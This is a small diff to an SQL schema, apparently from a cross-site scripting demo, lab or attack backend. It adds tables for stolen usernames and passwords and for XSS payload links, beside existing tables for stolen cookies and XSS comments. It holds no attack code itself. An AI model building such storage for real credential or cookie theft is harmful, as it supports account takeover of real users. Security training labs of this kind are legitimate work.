@@ -15,6 +15,21 @@ CREATE TABLE IF NOT EXISTS stolen_cookies (
     stolen_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
 
+
+CREATE TABLE IF NOT EXISTS stolen_credentials (
+    id SERIAL PRIMARY KEY,
+    username TEXT NOT NULL,
+    password TEXT NOT NULL,
+    stolen_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE IF NOT EXISTS xss_links (
+    id SERIAL PRIMARY KEY,
+    link_id VARCHAR(36) NOT NULL,
+    payload TEXT NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
 CREATE TABLE IF NOT EXISTS xss_comments (
     id SERIAL PRIMARY KEY,
     username VARCHAR(100) NOT NULL,
